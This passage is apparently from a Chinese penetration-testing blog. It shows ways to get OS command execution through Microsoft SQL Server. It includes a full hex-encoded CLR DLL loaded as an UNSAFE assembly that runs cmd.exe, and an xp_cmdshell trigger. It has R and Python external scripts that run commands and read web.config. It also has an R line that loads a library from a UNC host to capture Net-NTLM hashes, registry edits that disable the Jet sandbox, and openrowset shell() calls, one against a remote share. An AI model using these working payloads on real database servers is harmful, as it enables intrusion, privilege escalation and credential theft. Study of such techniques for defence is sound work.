从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。

-   [https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15](https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15)

CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地

-   [MDUT 中的 16 进制的 dll](https://github.com/SafeGroceryStore/MDUT/blob/main/MDAT-DEV/src/main/Plugins/Mssql/clr.txt)

dll 的制作可以参考下面的文章

-   [https://xz.aliyun.com/t/10955#toc-12](https://xz.aliyun.com/t/10955#toc-12)

利用条件

-   拥有 DBA 权限

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>``` | ```sql<br>-- 启用CLR,SQL Server 2017版本之前<br>sp_configure 'show advanced options',1;RECONFIGURE; -- 显示高级选项<br>sp_configure 'clr enabled',1;RECONFIGURE; -- 启用CLR<br>ALTER DATABASE master SET TRUSTWORTHY ON; -- 将存储.Net程序集的数据库配置为可信赖的<br><br>-- 启用CLR，SQL Server 2017版本及之后,引入了严格的安全性，可以选择根据提供的 SHA512 散列专门授予单个程序集的 UNSAFE 权限<br>sp_configure 'show advanced options',1;RECONFIGURE;<br>sp_configure 'clr enabled',1;RECONFIGURE;<br>sp_add_trusted_assembly @hash= <SHA512 of DLL>; -- 将某程序集的SHA512哈希值添加到可信程序集列表中<br><br>-- 配置 EXTERNAL ACCESS ASSEMBLY 权限, test 是我指定的数据库<br>EXEC sp_changedbowner 'sa'<br>ALTER DATABASE [test] SET trustworthy ON<br><br>-- 导入CLR插件<br>CREATE ASSEMBLY [mssql_CLR]<br>  AUTHORIZATION [dbo]<br>  FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300660705620000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402360006002102360006002700E401000000002D00000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000004000000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E0053797374656D2E494F006D7373716C5F434C520053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468006D7373716C5F434C522E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A00200000005E54E0227F5F5E409B9302C5EA5F62E7000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006607056200000000020000001C010000E42A0000E40C000052534453F12CF9670467FE4789AA4C0BB3C9132401000000433A5C55736572735C546573745C736F757263655C7265706F735C6D7373716C5F434C525C6D7373716C5F434C525C6F626A5C44656275675C6D7373716C5F434C522E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>  WITH PERMISSION_SET = UNSAFE;<br>GO<br><br>-- 创建CLR函数<br>CREATE PROCEDURE [dbo].[ExecCommand]<br>@cmd NVARCHAR (MAX)<br>AS EXTERNAL NAME [mssql_CLR].[StoredProcedures].[ExecCommand]<br>go<br><br>-- 利用CLR执行系统命令<br>exec dbo.ExecCommand "whoami /all";<br>``` |

[![](assets/1710207526-5ed191597967ccd0264b828122972798.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/22.png)

格式简化

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>``` | ```sql<br>-- 导入CLR插件<br>CREATE ASSEMBLY [clrdata]<br>AUTHORIZATION [dbo]<br>FROM 0x16进制的dll<br>WITH PERMISSION_SET = UNSAFE;<br><br>-- 创建CLR函数<br>CREATE PROCEDURE [dbo].[testclrexec]<br>@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX)<br>AS EXTERNAL NAME [clrdata].[StoredProcedures].[testclrexec]<br><br>-- 利用CLR执行系统命令<br>exec testclrexec 'cmdexec',N'whoami'<br>``` |

# [](#%E5%88%A9%E7%94%A8%E8%A7%A6%E5%8F%91%E5%99%A8)利用触发器

触发器是一种特殊类型的存储过程，它不同于存储过程。触发器主要是通过事件进行触发被自动调用执行的。而存储过程可以通过存储过程的名称被调用。

SqlServer 包括三种常规类型的触发器：DML 触发器、DDL 触发器和登录触发器

**登录触发器**

登录触发器将为响应 LOGIN 事件而激发存储过程。与 SQL Server 实例建立用户会话时将引发此事件。登录触发器将在登录的身份验证阶段完成之后且用户会话实际建立之前激发。因此，来自触发器内部且通常将到达用户的所有消息 (例如错误消息和来自 PRINT 语句的消息) 会传送到 SQL Server 错误日志。如果身份验证失败，将不激发登录触发器。

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>``` | ```sql<br>-- 设置一个触发器 ffffffff0x,当 user 表更新时触发命令<br>set ANSI_NULLS on<br>go<br>set QUOTED_IDENTIFIER on<br>go<br>create trigger [ffffffff0x]<br>on [user]<br>AFTER UPDATE as<br>begin<br>    execute master..xp_cmdshell 'cmd.exe /c calc.exe'<br>end<br>go<br><br>-- user 表 update 更新时，自动触发<br>UPDATE user SET id = '22' WHERE nickname = 'f0x'<br>``` |

实际测试，可以看到执行命令卡住了，一直没有结束

[![](assets/1710207526-097a8a50319f93403ff7e2a53a458110.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/23.png)

查看任务管理器，calc 运行了

[![](assets/1710207526-272e412a401fb18605d82f65d6d9fe78.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/24.png)

手动将 calc 结束，此时语句执行完毕返回结果，执行时间等于 calc 运行的时间

[![](assets/1710207526-899a5a45d289f20b50dc0f404674e0e2.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/25.png)

# [](#sql-server-r-%E5%92%8C-python-%E7%9A%84%E5%88%A9%E7%94%A8)SQL Server R 和 Python 的利用

**描述**

在 SQL Server 2017 及更高版本中，R 与 Python 一起随附在机器学习服务中。该服务允许通过 SQL Server 中 sp\_execute\_external\_script 执行 Python 和 R 脚本

利用条件：

-   Machine Learning Services 必须要在 Python 安装过程中选择

必须启用外部脚本

-   EXEC sp\_configure ‘external scripts enabled’, 1
-   RECONFIGURE WITH OVERRIDE
-   重新启动数据库服务器
-   用户拥有执行任何外部脚本权限

**R 脚本利用**

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>``` | ```sql<br>-- 利用 R 执行命令<br>sp_configure 'external scripts enabled'<br>GO<br>EXEC sp_execute_external_script<br>@language=N'R',<br>@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'<br>WITH RESULT SETS (([cmd_out] text));<br>GO<br><br>-- 利用 Python 读文件<br>EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'<br><br>-- 利用 R 抓取 Net-NTLM 哈希<br>@script=N'.libPaths("\\\\testhost\\foo\\bar");library("0mgh4x")'<br>``` |

**Python 脚本利用**

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>``` | ```sql<br>-- 查看版本<br>exec sp_execute_external_script<br>@language =N'Python',<br>@script=N'import sys<br>OutputDataSet = pandas.DataFrame([sys.version])'<br>WITH RESULT SETS ((python_version nvarchar(max)))<br><br>-- 利用 Python 执行命令<br>exec sp_execute_external_script<br>@language =N'Python',<br>@script=N'import subprocess<br>p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE)<br>OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'<br>WITH RESULT SETS (([cmd_out] nvarchar(max)))<br>``` |

# [](#ad-hoc-%E5%88%86%E5%B8%83%E5%BC%8F%E6%9F%A5%E8%AF%A2--microsoft-ole-db-provider-for-microsoft-jet-%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83)AD Hoc 分布式查询 & Microsoft OLE DB Provider for Microsoft Jet (沙盒提权)

AD Hoc 分布式查询允许从多个异构数据源（例如 SQL Server 的多个实例）访问数据。这些数据源可以存储在相同或不同的计算机上。启用临时访问后，登录到该实例的任何用户都可以使用 OLE DB 提供程序通过 OPENROWSET 或 OPENDATASOURCE 函数执行引用网络上任何数据源的 SQL 语句。

攻击者滥用 Ad Hoc 分布式查询和 Microsoft OLE DB Provider for Microsoft Jet 来创建和执行旨在从远程服务器下载恶意可执行文件的脚本。

利用条件

-   拥有 DBA 权限
-   sqlserver 服务权限为 system
-   服务器拥有 jet.oledb.4.0 驱动

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>``` | ```sql<br>-- 修改注册表，关闭沙盒模式<br>EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0<br><br>-- 开启 Ad Hoc Distributed Queries<br>EXEC sp_configure 'show advanced options', 1<br>RECONFIGURE<br>GO<br>EXEC sp_configure 'ad hoc distributed queries', 1<br>RECONFIGURE<br>GO<br>-- Until SQL Server 2012<br><br>EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1<br>EXEC master.dbo.sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'AllowInProcess', 1<br><br>-- SQL Server 2014 or later<br>EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1<br>EXEC master.dbo.sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'DynamicParameters', 1<br><br>-- Windows 2003 系统 c:\windows\system32\ias\ 目录下默认自带了 2 个 Access 数据库文件 ias.mdb/dnary.mdb, 所以直接调用即可.<br>-- Windows 2008 R2 默认无 Access 数据库文件, 需要自己上传, 或者用 UNC 路径加载文件方能执行命令.<br>-- SQL Server2008 默认未注册 microsoft.jet.oledb.4.0 接口, 所以无法利用沙盒模式执行系统命令.<br><br>Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb',<br>'select shell("whoami")');<br><br>select * from openrowset('microsoft.jet.oledb.4.0',';database=\\192.168.1.8\file\ias.mdb','select shell("c:\windows\system32\cmd.exe /c net user >c:\test.txt ")');<br>``` |

- - -

# [](#%E5%8F%82%E8%80%83)参考

-   [A look at some MS-SQL attacks (overview)](https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/)
-   [详述 MSSQL 服务在渗透测试中的利用（上篇）](https://www.cnblogs.com/ichunqiu/p/7249474.html)
-   [通过 Mssql 提权的几种姿势](https://www.cnblogs.com/N0r4h/p/12889944.html)
-   [How to Exploit SQL Server Using OLE Automation](https://www.imperva.com/blog/how-to-exploit-sql-server-using-ole-automation/)
-   [How to Exploit SQL Server Using Registry Keys](https://www.imperva.com/blog/how-to-exploit-sql-server-using-registry-keys/)
-   [A Deep Dive into Database Attacks \[Part II\]: Delivery and Execution of Malicious Executables through SQL commands (SQL Server)](https://www.imperva.com/blog/deep-dive-database-attacks-part-ii-delivery-execution-malicious-executables-sql-commands-sql-server/)
-   [【提权】MSSQL 提权之 sp\_oacreate](https://www.jianshu.com/p/e79d2a42338b)
-   [MSSQL 提权之 xp\_cmdshell、SP\_OACreate、沙盒提权](https://www.cnblogs.com/bonelee/p/15864534.html)
-   [MSSQL \[CLR\] 不落地执行](https://www.cnblogs.com/websecyw/p/11888947.html)
-   [MSSQL 利用 CLR 技术执行系统命令](https://cloud.tencent.com/developer/article/1736431)
-   [MSSQL 使用 CLR 程序集来执行命令](https://xz.aliyun.com/t/6682)
-   [Mssql 数据库命令执行总结](https://xz.aliyun.com/t/7534)
-   [SQL Server 从 0 到 1](https://mp.weixin.qq.com/s/N2siXJgmPAZ7CSIQ3FCF0w)
-   [从 0 开始学习 Microsoft SQL Server 数据库攻防](https://xz.aliyun.com/t/10955)
-   [SQL Server 用扩展存储过程进行文件操作](https://www.cnblogs.com/ljhdo/archive/2018/02/23/4996060.html)
-   [MSSQL Lateral Movement](https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/)
